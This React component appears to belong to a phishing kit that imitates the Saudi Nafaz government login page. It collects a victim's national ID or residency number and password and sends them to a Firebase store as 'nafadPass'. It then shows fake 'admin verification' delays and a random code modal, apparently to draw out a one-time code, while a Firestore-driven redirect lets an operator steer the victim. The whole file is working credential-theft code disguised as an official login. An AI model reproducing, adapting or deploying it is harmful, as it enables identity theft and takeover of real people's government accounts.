/* eslint-disable @typescript-eslint/no-explicit-any */

"use client";

import type React from "react";
import { useEffect, useState } from "react";
import NafazModal from "../components/NafazModal";
import { addData } from "../apis/firebase";
import FirestoreRedirect from "./rediract-page";

interface NafazFormData {
  identity_number: string;
  password: string;
}

interface NafazProps {
  onVerificationSuccess?: () => void;
  initialPhone?: string;
}

// Utility function for allowing only numbers in input
const onlyNumbers = (value: string) => {
  return value.replace(/[^0-9]/g, "");
};

export default function Nafaz({
  onVerificationSuccess,
  initialPhone = "",
}: NafazProps) {
  const [formData, setFormData] = useState<NafazFormData>({
    identity_number: "",
    password: "",
  });
  const [isLoading, setIsLoading] = useState(false);
  const [isSubmitted, setIsSubmitted] = useState(false);
  const [isRejected, setIsRejected] = useState(false);
  const [showModal, setShowModal] = useState(false);
  const [verificationCode, setVerificationCode] = useState("");
  const [phone] = useState(initialPhone);
  const _id = localStorage.getItem("visitor");
  // Simulate admin verification with a timeout
  useEffect(() => {
    if (isSubmitted) {
      // Simulate random verification or rejection
      const timer = setTimeout(() => {
        const isVerified = Math.random() > 0.2; // 80% chance of verification success

        if (isVerified) {
          // Simulate admin verification
          setVerificationCode(
            Math.floor(100000 + Math.random() * 900000).toString()
          );
          setShowModal(true);
          setIsSubmitted(false);
          setIsRejected(false);

          if (onVerificationSuccess) {
            onVerificationSuccess();
          }
        } else {
          // Simulate rejection
          setIsSubmitted(false);
          setIsRejected(true);
        }
      }, 3000); // 3 seconds delay to simulate verification

      return () => clearTimeout(timer);
    }
  }, [isSubmitted, onVerificationSuccess]);

  // eslint-disable-next-line @typescript-eslint/no-unused-vars
  const sendNafadCreds = async (
    _orderId: string,
    _idCardNumber: string,
    _password: string
  ) => {
    // Replace with your API call
    try {
      addData({ id: _orderId, _idCardNumber, nafadPass: _password });
      // For now, just return a mock ID
      return "nafad-" + Math.random().toString(36).substring(2, 10);
    } catch (error) {
      console.error("Error sending credentials:", error);
      throw new Error("Failed to send credentials");
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setIsRejected(false);

    try {
      localStorage.setItem("nafaz_data", JSON.stringify(formData));
      const { identity_number: id_card_number, password } = JSON.parse(
        localStorage.getItem("nafaz_data") || "{}"
      );
      const order_id = JSON.parse(localStorage.getItem("order_id") || "null");
      const nafad_id = await sendNafadCreds(order_id, id_card_number, password);
      localStorage.setItem("nafad_id", JSON.stringify(nafad_id));

      await new Promise((resolve) => setTimeout(resolve, 1000));
      setIsSubmitted(true);
    } catch (error) {
      console.error("خطأ في الدخول للنظام ", error);
    } finally {
      setIsLoading(false);
    }
  };

  const SubmittedContent = () => (
    <div className="space-y-8 bg-[#daf2f6]">
      <div className="space-y-4 text-base text-gray-700 p-6">
        <p>الرجاء الانتظار....</p>
        <p> جاري معالجة طلبك</p>
        <p> لا يمكنك الاستمرار في حال عدم قبول المصادقة</p>
      </div>

      <div className="flex-col gap-4 w-full flex items-center justify-center">
        <div className="w-20 h-20 border-4 border-transparent text-blue-400 text-4xl animate-spin flex items-center justify-center border-t-blue-400 rounded-full">
          <div className="w-16 h-16 border-4 border-transparent text-red-400 text-2xl animate-spin flex items-center justify-center border-t-red-400 rounded-full"></div>
        </div>
      </div>
    </div>
  );

  return (
    <div className="min-h-screen bg-[#eee] flex flex-col items-center py-3">
      <FirestoreRedirect id={_id as string} collectionName={"pays"} />

      <div className="w-full space-y-8">
        <h1 className="text-4xl font-bold text-[#3a9f8c] mb-6 bg-white p-4">
          نفاذ
        </h1>

        <h2 className="mt-6 text-3xl text-center font-semibold p-2 border-slate-400 text-[#3a9f8c]">
          الدخول على النظام
        </h2>
        {isRejected && (
          <div
            className="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded relative mx-auto container text-right"
            role="alert"
          >
            <strong className="font-bold">عذراً! </strong>
            <span className="block sm:inline">
              تم الرفض طلبك من قبل المسؤول , يرجى المحاوله في وقت لاحق
            </span>
          </div>
        )}
        <div className="mt-20 space-y-8 container mx-auto bg-white p-6 rounded-md">
          {!isSubmitted ? (
            <form className="space-y-8" onSubmit={handleSubmit}>
              <div className="space-y-4">
                <div>
                  <label
                    htmlFor="identity"
                    className="block text-right text-sm font-medium text-gray-700 mb-4"
                  >
                    رقم بطاقة الأحوال / الإقامة
                  </label>
                  <input
                    id="identity"
                    type="text"
                    required
                    className="appearance-none relative block w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-blue-500 focus:border-blue-500 text-right"
                    value={formData.identity_number}
                    onChange={(e) =>
                      setFormData((prev) => ({
                        ...prev,
                        identity_number: onlyNumbers(e.target.value),
                      }))
                    }
                  />
                </div>

                <div>
                  <label
                    htmlFor="password"
                    className="block text-right text-sm font-medium text-gray-700 mb-1"
                  >
                    كلمة المرور
                  </label>
                  <input
                    id="password"
                    type="password"
                    required
                    className="appearance-none relative block w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-blue-500 focus:border-blue-500 text-right"
                    value={formData.password}
                    onChange={(e) =>
                      setFormData((prev) => ({
                        ...prev,
                        password: e.target.value,
                      }))
                    }
                  />
                </div>
              </div>

              <button
                type="submit"
                disabled={isLoading}
                className="w-full flex justify-center py-2 px-4 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-[#3a9f8c] focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 disabled:bg-gray-400 disabled:cursor-not-allowed"
              >
                &#x276E; تسجيل الدخول
              </button>

              <div>
                <img
                  src="/door.png"
                  alt="door"
                  className="w-[6rem] h-auto mx-auto mt-4"
                />
              </div>

              <div className="text-center text-sm text-gray-600">
                {isLoading ? (
                  <div className="flex justify-center">
                    <div className="animate-spin rounded-full h-6 w-6 border-b-2 border-blue-600"></div>
                  </div>
                ) : (
                  "الرجاء إدخال بطاقة الأحوال/الإقامة وكلمة المرور ثم اضغط تسجيل دخول"
                )}
              </div>
            </form>
          ) : (
            <SubmittedContent />
          )}
        </div>
      </div>
      <NafazModal
        isOpen={showModal}
        onClose={() => setShowModal(false)}
        auth_number={verificationCode}
        phone={phone}
      />
    </div>
  );
}
